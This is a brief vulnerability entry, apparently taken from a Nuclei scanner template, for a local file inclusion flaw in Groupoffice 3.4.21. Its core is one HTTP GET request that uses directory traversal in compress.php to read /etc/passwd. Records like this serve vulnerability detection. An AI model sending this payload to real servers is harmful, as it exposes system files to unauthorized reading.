# Vulnerability: Groupoffice 3.4.21 - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`groupoffice-lfi.yaml`)

## Description
Groupoffice 3.4.21 is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/compress.php?file=../../../../../../../etc/passwd
```

